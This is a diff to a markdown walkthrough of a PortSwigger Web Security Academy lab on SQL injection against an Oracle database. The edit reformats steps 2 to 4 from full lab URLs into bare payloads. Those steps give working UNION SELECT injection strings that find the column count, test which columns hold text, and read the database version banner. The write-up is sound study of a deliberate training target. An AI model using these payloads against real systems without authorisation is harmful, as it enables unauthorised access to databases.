@@ -92,13 +92,13 @@ SQL injection is a security vulnerability allowing attackers to inject malicious
 
 
 2. Utilize UNION SELECT to discover all columns in the database and add FROM DUAL-- because the target is using Oracle. If the response page returns 500, try to add or delete NULL.
-    - URL: web-security-academy.net/filter?category=Gifts'+UNION+SELECT+NULL,NULL+FROM+DUAL--
+    - Payload: '+UNION+SELECT+NULL,NULL+FROM+DUAL--
 
 3. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter.
-    - URL: web-security-academy.net/filter?category=Gifts'+UNION+SELECT+'abc','def'+FROM+DUAL--
+    - Payload: '+UNION+SELECT+'abc','def'+FROM+DUAL--
 
 4. Use this payload to display the database version.
-    - URL: web-security-academy.net/filter?category=Gifts'+UNION+SELECT+NULL,+BANNER+FROM+v$version--
+    - Payload: '+UNION+SELECT+NULL,+BANNER+FROM+v$version--
 
 ![Alt text](/images/portswigger/sqli/lab3-solved.png "lab3-solved")
 
